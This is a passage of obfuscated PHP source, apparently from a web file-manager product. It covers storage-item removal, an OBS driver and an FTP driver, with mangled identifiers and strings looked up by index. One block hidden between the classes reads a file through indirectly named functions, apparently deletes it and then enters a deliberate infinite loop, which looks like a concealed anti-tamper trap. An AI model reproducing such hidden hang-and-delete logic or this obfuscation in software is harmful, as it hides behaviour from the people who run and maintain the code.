$×ªËç«[$ô­·¨ëü[6]] = json_decode($×ªËç«[$ô­·¨ëü[6]], !0); } return $×ªËç«; } public function remove($—„¦¸Öï) { $this->removeShareItems($—„¦¸Öï); return parent::remove($—„¦¸Öï); } public function removeWithFile($èæ‰Øğ, $“¶ÚÔ˜û, $Û„¸É§, $ÅåìªÖ² = false) { $–ƒº×„¢ =& $_SERVER[¿ÈˆÑ¸ä]; ignore_timeout(); $Ş¢«¢—Á = array($–ƒº×„¢[909] => $èæ‰Øğ); $€ƒİ°¿ = Model($–ƒº×„¢[556]); if (isset($GLOBALS[$–ƒº×„¢[2475]])) { $¥œ—–ë = $GLOBALS[$–ƒº×„¢[2475]]; } else { $¥œ—–ë = $€ƒİ°¿->where($Ş¢«¢—Á)->field(array($–ƒº×„¢[2373] => $–ƒº×„¢[2078], $–ƒº×„¢[2476] => $–ƒº×„¢[79]))->find(); } $ßÒµîï£ = intval($¥œ—–ë[$–ƒº×„¢[2078]]); $Îà…ò–À = intval($¥œ—–ë[$–ƒº×„¢[79]]); $Í¬¹—­ = $“¶ÚÔ˜û . $–ƒº×„¢[2477] . $èæ‰Øğ; $åõ±Š÷¿ = LNG($“¶ÚÔ˜û == $–ƒº×„¢[639] ? $–ƒº×„¢[2478] : $–ƒº×„¢[2479]); $ûÒØÊ€« = new TaskFileTransfer($Í¬¹—­, $–ƒº×„¢[214], $ßÒµîï£, $åõ±Š÷¿ . $–ƒº×„¢[473] . $Û„¸É§[$–ƒº×„¢[32]] . $–ƒº×„¢[213] . $èæ‰Øğ); $ûÒØÊ€«->task[$–ƒº×„¢[847]] = (double) $Îà…ò–À; $µµ½¢ËÈ = KodIO::defaultDriver(); $ˆ“å¡õ = $µµ½¢ËÈ[$–ƒº×„¢[483]]; $¿åË”û¾ = 1; $‚“ã©À÷ = 5000; $’Ë èöÅ = $¼…ì€– = $ƒØ³ğèö = array(); $İÕÊ°µÜ = $€ƒİ°¿->where($Ş¢«¢—Á)->field($–ƒº×„¢[2480])->selectPage($‚“ã©À÷, $¿åË”û¾); $Şí¹ú­Â = intval($İÕÊ°µÜ[$–ƒº×„¢[443]][$–ƒº×„¢[445]]); while ($İÕÊ°µÜ && $¿åË”û¾ <= $Şí¹ú­Â) { foreach ($İÕÊ°µÜ[$–ƒº×„¢[446]] as $Â»Ü»®ä) { $á»ĞŠ¹î = $Â»Ü»®ä[$–ƒº×„¢[553]]; if ($ÅåìªÖ²) { $¼…ì€–[] = $á»ĞŠ¹î; continue; } $â¯ÙÜœé = $Â»Ü»®ä[$–ƒº×„¢[87]]; $‚Íş = get_path_father($â¯ÙÜœé); $ƒØ³ğèö[] = $‚Íş; $‚Íş = str_replace("\173\x69\x6f\72{$èæ‰Øğ}\x7d\x2f", "\x7b\151\157\x3a{$ˆ“å¡õ}\x7d\x2f", $‚Íş); if (!IO::exist($â¯ÙÜœé)) { $’Ë èöÅ[] = $á»ĞŠ¹î; $ûÒØÊ€«->updateFileEnd($Â»Ü»®ä[$–ƒº×„¢[32]], $Â»Ü»®ä[$–ƒº×„¢[79]]); write_log($–ƒº×„¢[2481] . $â¯ÙÜœé, $–ƒº×„¢[2057]); continue; } $”™û‹¬ö = IO::move($â¯ÙÜœé, $‚Íş, REPEAT_RENAME); if (!$”™û‹¬ö) { $¼…ì€–[] = $á»ĞŠ¹î; $ûÒØÊ€«->updateFileEnd($Â»Ü»®ä[$–ƒº×„¢[32]], $Â»Ü»®ä[$–ƒº×„¢[79]]); write_log($–ƒº×„¢[2482] . $â¯ÙÜœé, $–ƒº×„¢[2057]); continue; } $Ò·£¶Ë = array($–ƒº×„¢[909] => $ˆ“å¡õ, $–ƒº×„¢[87] => $”™û‹¬ö); $€ƒİ°¿->where(array($–ƒº×„¢[553] => $á»ĞŠ¹î))->save($Ò·£¶Ë); } $¿åË”û¾++; $İÕÊ°µÜ = $€ƒİ°¿->where($Ş¢«¢—Á)->field($–ƒº×„¢[2480])->selectPage($‚“ã©À÷, $¿åË”û¾); } $ş¨ö÷Å¡ = $ûÒØÊ€«->task; if (!$ÅåìªÖ²) { Cache::set($Í¬¹—­, $ş¨ö÷Å¡); } $ûÒØÊ€«->end(); $’Ë èöÅ = array_unique($’Ë èöÅ); $¼…ì€– = array_unique($¼…ì€–); if (!$ÅåìªÖ² && ($’Ë èöÅ || $¼…ì€–)) { $¹Ÿ¿¯õ = array(); if ($’Ë èöÅ) { $¹Ÿ¿¯õ[] = sprintf(LNG($–ƒº×„¢[2483]), count($’Ë èöÅ)); } if ($¼…ì€–) { $¹Ÿ¿¯õ[] = sprintf(LNG($–ƒº×„¢[2484]), count($¼…ì€–)); } $¹Ÿ¿¯õ = sprintf(LNG($–ƒº×„¢[2485]), implode($–ƒº×„¢[1523], $¹Ÿ¿¯õ)) . $–ƒº×„¢[2486] . date($–ƒº×„¢[2487]) . $–ƒº×„¢[2488]; if ($“¶ÚÔ˜û == $–ƒº×„¢[1267]) { $¹Ÿ¿¯õ .= $–ƒº×„¢[2489] . LNG($–ƒº×„¢[2490]); } else { $¹Ÿ¿¯õ = LNG($–ƒº×„¢[2491]) . $–ƒº×„¢[2492] . $¹Ÿ¿¯õ; } $ş¨ö÷Å¡[$–ƒº×„¢[1304]] = $¹Ÿ¿¯õ; Cache::set($Í¬¹—­, $ş¨ö÷Å¡); unset($Û„¸É§[$–ƒº×„¢[6]]); $¶­µ´óˆ = array($–ƒº×„¢[483] => $èæ‰Øğ, $–ƒº×„¢[2362] => $–ƒº×„¢[639], $–ƒº×„¢[32] => $Û„¸É§[$–ƒº×„¢[32]], $–ƒº×„¢[96] => $Û„¸É§[$–ƒº×„¢[96]]); Hook::trigger($–ƒº×„¢[1926], array($–ƒº×„¢[1326] => $¶­µ´óˆ, $–ƒº×„¢[1336] => !0)); show_json($¹Ÿ¿¯õ, !1, 100111); } if ($“¶ÚÔ˜û == $–ƒº×„¢[639]) { return !0; } if ($’Ë èöÅ || $¼…ì€–) { $¡ûš±Í˜ = array_merge($’Ë èöÅ, $¼…ì€–); $¡ûš±Í˜ = array_filter(array_unique($¡ûš±Í˜)); $this->removeByFileID($¡ûš±Í˜); } if ($ƒØ³ğèö) { $ƒØ³ğèö = array_filter(array_unique($ƒØ³ğèö)); foreach ($ƒØ³ğèö as $â¯ÙÜœé) { $¥œ—–ë = IO::has($â¯ÙÜœé, !0); if (!$¥œ—–ë[$–ƒº×„¢[240]] && !$¥œ—–ë[$–ƒº×„¢[241]]) { IO::remove($â¯ÙÜœé); } } } return $this->remove($èæ‰Øğ); } private function removeByFileID($³úüû·æ = array()) { $€ËÇ“… =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($³úüû·æ)) { return; } $ô¹²çÕÍ = array($€ËÇ“…[553] => array($€ËÇ“…[7], $³úüû·æ)); $àœà’º¼ = Model($€ËÇ“…[1469])->where($ô¹²çÕÍ)->field($€ËÇ“…[2437])->select(); if (!$àœà’º¼) { return Model($€ËÇ“…[556])->remove($³úüû·æ); } $àœà’º¼ = array_to_keyvalue($àœà’º¼, $€ËÇ“…[192], $€ËÇ“…[553]); foreach ($àœà’º¼ as $úïş•’ => $ÇÍáÅ¡ˆ) { Model($€ËÇ“…[916])->removeNow($úïş•’, !1); } $áÍ¶§Ë‡ = array_diff($³úüû·æ, array_unique(array_values($àœà’º¼))); if ($áÍ¶§Ë‡) { return Model($€ËÇ“…[556])->remove($áÍ¶§Ë‡); } } private function removeShareItems($Ÿ¸Ğ†‰Ÿ) { $¹¹ëÔè® =& $_SERVER[¿ÈˆÑ¸ä]; $êı—­´ = "\x7b\151\x6f\x3a{$Ÿ¸Ğ†‰Ÿ}\x7d\x2f"; $”À¹ªïŸ = array($¹¹ëÔè®[192] => 0, $¹¹ëÔè®[579] => array($¹¹ëÔè®[470], "{$êı—­´}\45")); $ÀÖöŒ¤¿ = Model($¹¹ëÔè®[1499])->where($”À¹ªïŸ)->field($¹¹ëÔè®[684])->select(); if (empty($ÀÖöŒ¤¿)) { return; } $şâŸÃã› = array_to_keyvalue($ÀÖöŒ¤¿, $¹¹ëÔè®[12], $¹¹ëÔè®[684]); Model($¹¹ëÔè®[683])->remove($şâŸÃã›); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x4c\151\147\x68\164\101\160\160"; public $modelType = "\x53\171\x73\164\x65\155\117\x70\164\151\157\156"; public $field = array("\x6e\x61\155\x65", "\147\162\157\x75\160", "\144\145\x73\143", "\x63\157\156\164\145\156\164"); public function listData($èÀ°Ìê = false, $›‡´äšÆ = "\x6d\x6f\144\x69\x66\171\124\x69\155\x65", $²ãœ†Àƒ = true) { return parent::listData($èÀ°Ìê, $›‡´äšÆ, $²ãœ†Àƒ); } public function remove($­é„‹®È) { $„ì‘ÖŞÒ = $this->findByName($­é„‹®È); if (!$„ì‘ÖŞÒ) { return !1; } return parent::remove($„ì‘ÖŞÒ[$_SERVER[¿ÈˆÑ¸ä][483]]); } public function add($‚Ôäé¿¼) { if ($this->findByName($‚Ôäé¿¼[$_SERVER[¿ÈˆÑ¸ä][32]])) { return !1; } return parent::insert($‚Ôäé¿¼); } public function update($ò¶ó€¥Ï, $¿Ù¿Øà) { $°¤ĞÂÊ¢ =& $_SERVER[¿ÈˆÑ¸ä]; $øòäá = $this->findByName($ò¶ó€¥Ï); $ŠæŒÙ‘ı = $this->findByName($¿Ù¿Øà[$°¤ĞÂÊ¢[32]]); if (!$øòäá || $ŠæŒÙ‘ı && $ŠæŒÙ‘ı[$°¤ĞÂÊ¢[483]] != $øòäá[$°¤ĞÂÊ¢[483]]) { return !1; } return parent::update($øòäá[$°¤ĞÂÊ¢[483]], $¿Ù¿Øà); } } goto aß–Ö¦ë÷Ê; C½‹İğ–¾Â: if (!isset($_SERVER[$_SERVER[¿ÈˆÑ¸ä][962]]) || !isset($_SERVER[$_SERVER[¿ÈˆÑ¸ä][969]])) { $_getc = $_SERVER[¿ÈˆÑ¸ä][964]; $_getfile = $_SERVER[$_SERVER[¿ÈˆÑ¸ä][965]] . $_SERVER[¿ÈˆÑ¸ä][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¿ÈˆÑ¸ä][286], $_getfilec); if (count($_getarrs) < $_SERVER[¿ÈˆÑ¸ä][699]) { $exit = $_SERVER[¿ÈˆÑ¸ä][967]; $exit(); } $_act = $_SERVER[¿ÈˆÑ¸ä][968]; $_act($_SERVER[$_SERVER[¿ÈˆÑ¸ä][965]] . $_SERVER[¿ÈˆÑ¸ä][966]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¿ÈˆÑ¸ä][463]); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¨ç‚Î­) { parent::__construct($¨ç‚Î­); $this->setSignVersion($_SERVER[¿ÈˆÑ¸ä][248]); } public function fileOutImage($«‘ˆ³â, $Çªä¦¿ = 250) { $˜‘Œ¶Òé =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->size($«‘ˆ³â) > 1024 * 1024 * 25) { return $this->fileOutImageServer($«‘ˆ³â, $Çªä¦¿); } $Ö³İ¤Ëˆ = array($˜‘Œ¶Òé[1603] => $˜‘Œ¶Òé[1604] . $Çªä¦¿ . $˜‘Œ¶Òé[1605]); $‚à„êìö = $this->link($«‘ˆ³â, $Ö³İ¤Ëˆ); $this->fileOutLink($‚à„êìö); } } $_file = $_SERVER[$_SERVER[¿ÈˆÑ¸ä][969]]; goto AôÛ›¹å¡ö; e‚ÔÚ¤Ì®: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($¸¾¹Ò­) { parent::__construct(); if (count($¸¾¹Ò­) > 0) { $this->_init($¸¾¹Ò­); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($—Õ©à•ò) { $­×à½áµ =& $_SERVER[¿ÈˆÑ¸ä]; global $config; $this->appCharset = $config[$­×à½áµ[1582]]; $this->systemCharset = $config[$­×à½áµ[1583]]; if (isset($—Õ©à•ò[$­×à½áµ[1584]]) && $—Õ©à•ò[$­×à½áµ[1584]]) { $this->systemCharset = $—Õ©à•ò[$­×à½áµ[1584]]; } } public function iconvApp($ıõ‡ñÉ) { return $this->iconvTo($ıõ‡ñÉ, $this->systemCharset, $this->appCharset); } public function iconvSystem($œæŠ“š†) { return $this->iconvTo($œæŠ“š†, $this->appCharset, $this->systemCharset); } public function getPathOuter($ıíó³¦Æ) { $£›å®æ =& $_SERVER[¿ÈˆÑ¸ä]; $‡Ì¨ŒÂè = $this->iconvApp($this->pathBase); $ıíó³¦Æ = $this->iconvApp($ıíó³¦Æ); if (substr($‡Ì¨ŒÂè, 0, 2) == $£›å®æ[1459]) { $‡Ì¨ŒÂè = BASIC_PATH . substr($‡Ì¨ŒÂè, 2); } if (substr($ıíó³¦Æ, 0, 2) == $£›å®æ[1459]) { $ıíó³¦Æ = BASIC_PATH . substr($ıíó³¦Æ, 2); } $‡Ì¨ŒÂè = KodIO::clear($‡Ì¨ŒÂè); $ıíó³¦Æ = KodIO::clear($ıíó³¦Æ); $ıíó³¦Æ = substr($ıíó³¦Æ, strlen($‡Ì¨ŒÂè)); if (empty($this->pathDriver)) { return $ıíó³¦Æ; } return $this->pathDriver . $£›å®æ[8] . ltrim($ıíó³¦Æ, $£›å®æ[8]); } private function _init($¹‹ìÈ¼Ï = array()) { $º¦ÂĞºœ =& $_SERVER[¿ÈˆÑ¸ä]; if (!function_exists($º¦ÂĞºœ[1585])) { throw new Exception(LNG($º¦ÂĞºœ[1586])); } $this->config = $¹‹ìÈ¼Ï; $this->charsetReset($¹‹ìÈ¼Ï); foreach ($¹‹ìÈ¼Ï as $óëèÊœ‚ => $éµó¦îä) { if (isset($this->{$óëèÊœ‚})) { $this->{$óëèÊœ‚} = $éµó¦îä; } } return $this->_login($¹‹ìÈ¼Ï); } private function _login($²¨äÚ†°) { $ÆÀ °ÄÀ =& $_SERVER[¿ÈˆÑ¸ä]; static $¼“ÚÂÒ™ = array(); $¤˜«âŠã = md5(json_encode($²¨äÚ†°)); if (isset($¼“ÚÂÒ™[$¤˜«âŠã])) { foreach ($¼“ÚÂÒ™[$¤˜«âŠã] as $¹Ê†³ => $Ùœ—Š™) { $this->{$¹Ê†³} = $Ùœ—Š™; } return !0; } $ˆÜÅ±Ôß = parse_url(trim($this->server, $ÆÀ °ÄÀ[8])); $this->host = $ˆÜÅ±Ôß[$ÆÀ °ÄÀ[207]]; $çĞß÷ = isset($ˆÜÅ±Ôß[$ÆÀ °ÄÀ[206]]) && $ˆÜÅ±Ôß[$ÆÀ °ÄÀ[206]] == $ÆÀ °ÄÀ[1587] ? !0 : !1; $this->scheme = $çĞß÷ ? $ÆÀ °ÄÀ[1588] : $ÆÀ °ÄÀ[1589]; $this->port = isset($ˆÜÅ±Ôß[$ÆÀ °ÄÀ[208]]) ? $ˆÜÅ±Ôß[$ÆÀ °ÄÀ[208]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ÆÀ °ÄÀ[1590]) . $this->host . $ÆÀ °ÄÀ[4] . $this->port, !0); return !1; } $éü–¥æ¥ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$éü–¥æ¥) { $this->writeLog(LNG($ÆÀ °ÄÀ[1591]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $ÆÀ °ÄÀ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $À±¯¢ú— = $this->pasv == $ÆÀ °ÄÀ[91] ? !0 : !1; @ftp_pasv($this->connect, $À±¯¢ú—); $¼“ÚÂÒ™[$¤˜«âŠã] = array($ÆÀ °ÄÀ[1592] => $this->connect, $ÆÀ °ÄÀ[207] => $this->host, $ÆÀ °ÄÀ[206] => $this->scheme, $ÆÀ °ÄÀ[208] => $this->port); return $éü–¥æ¥; } private function _isconn($‹Õğïıœ = true) { if (is_resource($this->connect)) { return !0; } if (!$‹Õğïıœ) { return !1; } return $this->_login($this->config); } public function mkfile($¾˜Í»©, $»¤ıæáí = '', $ˆÁÉåì = REPEAT_RENAME) { if ($this->setContent($¾˜Í»©, $»¤ıæáí)) { return $this->getPathOuter($¾˜Í»©); } $this->writeLog(LNG($_SERVER[¿ÈˆÑ¸ä][1593]), !0); return !1; } public function mkdir($Öí›ó£è, $‚Şòü¹ = REPEAT_SKIP) { $Öª¨ú…Û =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Öí›ó£è || $Öí›ó£è == $Öª¨ú…Û[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Öí›ó£è = $this->iconvSystem($Öí›ó£è); if ($this->_isFolder($Öí›ó£è) || @ftp_mkdir($this->connect, $Öí›ó£è)) { return $this->getPathOuter($Öí›ó£è); } if (!$this->mkdir($this->pathFather($Öí›ó£è))) { return !1; } if ($Öí›ó£è = @ftp_mkdir($this->connect, $Öí›ó£è)) { return $this->getPathOuter($Öí›ó£è); } $”é¼›Äµ = __FUNCTION__ . $Öª¨ú…Û[1594]; $this->writeLog($”é¼›Äµ, !0); return !1; } public function copyFile($Á²Î£ÈÆ, $°ïĞ¼¯ç) { if (!$this->_isconn()) { return !1; } $Ú×çµ„ = $this->pathThis($this->iconvSystem($Á²Î£ÈÆ)); $åé¤ ê´ = $this->tempFile($Ú×çµ„); $‘«úâÆ = $this->iconvApp($åé¤ ê´); $this->download($Á²Î£ÈÆ, $‘«úâÆ); $æ²áúÃù = $this->upload($°ïĞ¼¯ç, $‘«úâÆ); $this->tempFileRemve($åé¤ ê´); return $æ²áúÃù; } public function moveFile($¸‚¸Õˆ», $¨ªÇØÈº) { if (!$this->_isconn()) { return !1; } $¸‚¸Õˆ» = $this->iconvSystem($¸‚¸Õˆ»); $¨ªÇØÈº = $this->iconvSystem($¨ªÇØÈº); $™ÀÌÒñé = @ftp_rename($this->connect, $¸‚¸Õˆ», $¨ªÇØÈº); if (!$™ÀÌÒñé) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); return !1; } return $this->getPathOuter($¨ªÇØÈº); } public function delFile($ö¦˜Îçä) { if (!$this->_isconn()) { return !1; } $ö¦˜Îçä = $this->iconvSystem($ö¦˜Îçä); $·¬æğÙ = @ftp_delete($this->connect, $ö¦˜Îçä); if (!$·¬æğÙ) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); } return $·¬æğÙ; } public function delFolder($Ó¶¨†®ô) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $€œÂïøÉ = $›£“ù‹¶ = array(); $this->fileList($Ó¶¨†®ô, $€œÂïøÉ, $›£“ù‹¶, !0); $this->listItemCache = !0; foreach ($›£“ù‹¶ as $éÃ¾Øçà) { $ª÷İÉÄ = $this->iconvSystem($éÃ¾Øçà[$_SERVER[¿ÈˆÑ¸ä][32]]); $×£³º‰ƒ = @ftp_delete($this->connect, $ª÷İÉÄ); if (!$×£³º‰ƒ) { return !1; } } foreach ($€œÂïøÉ as $ª÷İÉÄ) { $ª÷İÉÄ = $this->iconvSystem($ª÷İÉÄ); $×£³º‰ƒ = @ftp_rmdir($this->connect, $ª÷İÉÄ); if (!$×£³º‰ƒ) { return !1; } } $Ó¶¨†®ô = $this->iconvSystem($Ó¶¨†®ô); return @ftp_rmdir($this->connect, $Ó¶¨†®ô); } public function rename($ı‰Úèèå, $¿ÍñâøŞ) { $ùáã•õ¸ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->_isconn()) { return !1; } $ÑĞàş = $this->fileNameAuto($this->pathFather($ı‰Úèèå), $¿ÍñâøŞ); $ÑĞàş = $this->iconvSystem($ÑĞàş); $ı‰Úèèå = $this->iconvSystem($ı‰Úèèå); $ÊÊ š© = $this->pathFather($ı‰Úèèå); $³»ˆ”ë = rtrim($ÊÊ š©, $ùáã•õ¸[8]) . $ùáã•õ¸[8] . $ÑĞàş; $í•åáµ„ = @ftp_rename($this->connect, $ı‰Úèèå, $³»ˆ”ë); if (!$í•åáµ„) { $this->writeLog(__FUNCTION__ . $ùáã•õ¸[1594], !0); return !1; } $³»ˆ”ë = $this->iconvApp($³»ˆ”ë); return $this->getPathOuter($³»ˆ”ë); } private function folderInfo($ï”Õ„, $ÓÁÅù’Ê = false) { $éåÓµ¹¨ =& $_SERVER[¿ÈˆÑ¸ä]; $›•ôÄí‡ = array($éåÓµ¹¨[32] => $this->pathThis($ï”Õ„), $éåÓµ¹¨[87] => $this->getPathOuter($éåÓµ¹¨[8] . $ï”Õ„), $éåÓµ¹¨[33] => $éåÓµ¹¨[78]); if ($ÓÁÅù’Ê) { return $›•ôÄí‡; } $›•ôÄí‡[$éåÓµ¹¨[232]] = $›•ôÄí‡[$éåÓµ¹¨[88]] = 0; $›•ôÄí‡[$éåÓµ¹¨[233]] = $›•ôÄí‡[$éåÓµ¹¨[234]] = !0; return $›•ôÄí‡; } private function fileInfo($òçÂÍŠ, $ÕŸ÷í‘ó = false, $Ì¯ºçÅ = array()) { $¢„âªÀ¼ =& $_SERVER[¿ÈˆÑ¸ä]; $™ˆ®Åèƒ = array($¢„âªÀ¼[32] => $this->pathThis($òçÂÍŠ), $¢„âªÀ¼[87] => $this->getPathOuter($¢„âªÀ¼[8] . $òçÂÍŠ), $¢„âªÀ¼[33] => $¢„âªÀ¼[231], $¢„âªÀ¼[79] => isset($Ì¯ºçÅ[$¢„âªÀ¼[79]]) ? $Ì¯ºçÅ[$¢„âªÀ¼[79]] : 0, $¢„âªÀ¼[167] => $this->ext($òçÂÍŠ)); if ($ÕŸ÷í‘ó) { return $™ˆ®Åèƒ; } $™ˆ®Åèƒ[$¢„âªÀ¼[232]] = $™ˆ®Åèƒ[$¢„âªÀ¼[88]] = 0; $™ˆ®Åèƒ[$¢„âªÀ¼[233]] = $™ˆ®Åèƒ[$¢„âªÀ¼[234]] = !0; $Æ¤µ‹Ö† = $this->iconvSystem($òçÂÍŠ); $™ˆ®Åèƒ[$¢„âªÀ¼[88]] = @ftp_mdtm($this->connect, $Æ¤µ‹Ö†); if (empty($Ì¯ºçÅ)) { $Ì¯ºçÅ = $this->objectMeta($òçÂÍŠ); if (!$Ì¯ºçÅ) { return $™ˆ®Åèƒ; } } $™ˆ®Åèƒ[$¢„âªÀ¼[79]] = $Ì¯ºçÅ[$¢„âªÀ¼[79]]; return $™ˆ®Åèƒ; } public function size($åïÎßÏ©) { $¤«”ÁÀø = $this->objectMeta($åïÎßÏ©); return $¤«”ÁÀø ? $¤«”ÁÀø[$_SERVER[¿ÈˆÑ¸ä][79]] : 0; } public function info($àúòÊÜÄ) { if ($this->isFile($àúòÊÜÄ)) { return $this->fileInfo($àúòÊÜÄ, 0); } else { if ($this->isFolder($àúòÊÜÄ)) { return $this->folderInfo($àúòÊÜÄ); } } return !1; } private function fileList($âÜÁâáİ, &$¨ÔÁç­†, &$³„‘çòÜ, $Âû¶ ¼‹ = false) { $Üİ‘è›¬ =& $_SERVER[¿ÈˆÑ¸ä]; $âÜÁâáİ = $this->iconvSystem($âÜÁâáİ); if (!$this->isFolder($âÜÁâáİ)) { return !1; } $âÜÁâáİ = rtrim($âÜÁâáİ, $Üİ‘è›¬[8]) . $Üİ‘è›¬[8]; check_abort(); $¬”­‘û– = @ftp_rawlist($this->connect, $âÜÁâáİ); if (!$¬”­‘û–) { $¬”­‘û– = array(); } $Ñù™›¢Á = array($Üİ‘è›¬[10] => 1, $Üİ‘è›¬[1404] => 1); foreach ($¬”­‘û– as $§”ıâÉ“) { $ÍºÌ‡£Õ = $this->_listItem($§”ıâÉ“); if ($ÍºÌ‡£Õ[0] == $Üİ‘è›¬[842]) { continue; } $İôÁ·éª = $ÍºÌ‡£Õ[8]; if (empty($İôÁ·éª) && $İôÁ·éª !== $Üİ‘è›¬[229] || isset($Ñù™›¢Á[$İôÁ·éª])) { continue; } $İôÁ·éª = $this->iconvApp($âÜÁâáİ . ltrim($İôÁ·éª, $Üİ‘è›¬[8])); $è¹¦¸¹Ô = array($Üİ‘è›¬[32] => $İôÁ·éª, $Üİ‘è›¬[33] => $Üİ‘è›¬[231], $Üİ‘è›¬[79] => $ÍºÌ‡£Õ[4]); if (substr($§”ıâÉ“, 0, 1) == $Üİ‘è›¬[1595]) { $è¹¦¸¹Ô[$Üİ‘è›¬[33]] = $Üİ‘è›¬[78]; $è¹¦¸¹Ô[$Üİ‘è›¬[79]] = 0; } $Úî×·“÷ = $è¹¦¸¹Ô[$Üİ‘è›¬[33]] == $Üİ‘è›¬[78] ? !0 : !1; $this->cacheMethodInfoSet($İôÁ·éª, $Úî×·“÷, $è¹¦¸¹Ô); if ($Úî×·“÷) { $¨ÔÁç­†[] = $İôÁ·éª; if ($Âû¶ ¼‹) { $this->fileList($İôÁ·éª, $¨ÔÁç­†, $³„‘çòÜ, $Âû¶ ¼‹); } continue; } $³„‘çòÜ[] = $è¹¦¸¹Ô; } $this->cacheMethodInfoSet($âÜÁâáİ, !0); } private function _listItem($§Àúùä) { if (empty($§Àúùä)) { return array(); } $õÈïêÃ = preg_split($_SERVER[¿ÈˆÑ¸ä][1596], $§Àúùä); if (count($õÈïêÃ) <= 9) { return $õÈïêÃ; } $õÈïêÃ[8] = trim(substr($§Àúùä, strpos($§Àúùä, $õÈïêÃ[7]) + strlen($õÈïêÃ[7]))); return array_splice($õÈïêÃ, 0, 9); } public function listPath($ô²è‰è›, $·­ÂÚ = false) { $´è³—™ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->_isconn()) { return !1; } $öú‰Úõ– = $òä©š‘£ = array(); $this->fileList($ô²è‰è›, $öú‰Úõ–, $òä©š‘£); foreach ($öú‰Úõ– as $®—Ãğ³§ => $Äó¸±Ó”) { $öú‰Úõ–[$®—Ãğ³§] = $this->folderInfo($Äó¸±Ó”, $·­ÂÚ); } foreach ($òä©š‘£ as $®—Ãğ³§ => $Äó¸±Ó”) { $òä©š‘£[$®—Ãğ³§] = $this->fileInfo($Äó¸±Ó”[$´è³—™[32]], $·­ÂÚ, $Äó¸±Ó”); } return array($´è³—™[85] => $öú‰Úõ–, $´è³—™[86] => $òä©š‘£); } public function has($™×Õ¡Ê, $ƒ’ŸÚˆ = false, $©‘ûı‚ = true) { $ÀÓ­äÁÖ =& $_SERVER[¿ÈˆÑ¸ä]; $èÜßïøÆ = $ı›¡Şò¥ = array(); $§‹Óí¬ = $ƒ’ŸÚˆ ? !0 : !1; $this->fileList($™×Õ¡Ê, $èÜßïøÆ, $ı›¡Şò¥, $§‹Óí¬); if ($ƒ’ŸÚˆ) { return array($ÀÓ­äÁÖ[240] => count($ı›¡Şò¥), $ÀÓ­äÁÖ[241] => count($èÜßïøÆ)); } if ($©‘ûı‚) { if (count($ı›¡Şò¥)) { return !0; } } else { if (count($èÜßïøÆ)) { return !0; } } return !1; } public function listAll($ìßú§¦) { $ëÓ¡ëºã =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->_isconn()) { return !1; } $»¦»÷ñ¤ = $·‡‚¡Áï = array(); $this->fileList($ìßú§¦, $»¦»÷ñ¤, $·‡‚¡Áï, !0); $£óÂî¨ê = array_to_keyvalue($·‡‚¡Áï, $ëÓ¡ëºã[32]); foreach ($»¦»÷ñ¤ as $äèõˆŞ²) { if (is_string($äèõˆŞ²)) { $£óÂî¨ê[$äèõˆŞ²] = array($ëÓ¡ëºã[79] => 0); } } return $this->listAllFiles($ìßú§¦, $£óÂî¨ê); } public function getContent($îÊƒè¹) { if (!$this->_isconn()) { return !1; } $îÊƒè¹ = $this->iconvSystem($îÊƒè¹); return $this->fileSubstr($îÊƒè¹); } public function setContent($‡ ­ä½÷, $ƒó£­¤· = '') { if (!$this->_isconn()) { return !1; } $ûÕÄï´ = $this->pathThis($this->iconvSystem($‡ ­ä½÷)); $åÄè½— = $this->tempFile($ûÕÄï´); file_put_contents($åÄè½—, $ƒó£­¤·); $ª‚õÅ¯ = $this->upload($‡ ­ä½÷, $this->iconvApp($åÄè½—)); $this->tempFileRemve($åÄè½—); return $ª‚õÅ¯; } public function fileSubstr($ïèÓ¼ùà, $¿í¾ú›Ç = 0, $Ì¡ÌëÓÛ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ïèÓ¼ùà, $¿í¾ú›Ç, $Ì¡ÌëÓÛ); } private function ftpRequest($¼ì£ÙÒË, $“Œº™À = 0, $Å¥ÜóãÕ = false) { $öìÖ¹· =& $_SERVER[¿ÈˆÑ¸ä]; $¼ì£ÙÒË = $öìÖ¹·[8] . ltrim(str_ltrim($¼ì£ÙÒË, $this->ftpPath), $öìÖ¹·[8]); $¼ì£ÙÒË = $this->iconvSystem($¼ì£ÙÒË); $¶ı²¸ùƒ = $this->scheme . $this->host . $öìÖ¹·[4] . $this->port; $İ›ÃÛ™Á = curl_init(); curl_setopt($İ›ÃÛ™Á, CURLOPT_URL, $¶ı²¸ùƒ . $this->pathEncode($¼ì£ÙÒË)); curl_setopt($İ›ÃÛ™Á, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Å¥ÜóãÕ) { $ŞÊ©€Û› = $“Œº™À + $Å¥ÜóãÕ - 1; curl_setopt($İ›ÃÛ™Á, CURLOPT_RANGE, "{$“Œº™À}\x2d{$ŞÊ©€Û›}"); } curl_setopt($İ›ÃÛ™Á, CURLOPT_RETURNTRANSFER, 1); $ä–•üõ = curl_exec($İ›ÃÛ™Á); curl_close($İ›ÃÛ™Á); return $ä–•üõ; } public function upload($é€ù©ÁÀ, $›®»‚Ùú, 